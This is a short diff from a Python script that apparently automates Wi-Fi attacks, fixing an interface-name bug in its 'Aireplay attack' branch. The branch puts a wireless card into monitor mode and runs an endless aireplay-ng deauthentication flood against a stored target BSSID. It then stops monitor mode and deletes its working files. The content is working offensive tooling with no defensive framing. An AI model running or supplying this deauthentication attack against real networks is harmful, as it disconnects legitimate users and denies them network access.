@@ -61,7 +61,7 @@ if attack == '1':
 else:
   print("############################# Aireplay attack! ###################################")
   os.system("monitor=`cat monitor.rmo` && tchannel=`cat tchannel.rmo` && airmon-ng start $monitor $tchannel")
-  os.system("monitor=`cat monitor.rmo`mon && tbssid=`cat tbssid.rmo` && aireplay-ng -0 0 -a $tbssid $monitor")
+  os.system("monitor=`cat monitor.rmo` && tbssid=`cat tbssid.rmo` && aireplay-ng -0 0 -a $tbssid $monitor")
   os.system("monitor=`cat monitor.rmo` && airmon-ng stop $monitor")
   os.system('rm *.rmo && rm target*')
   
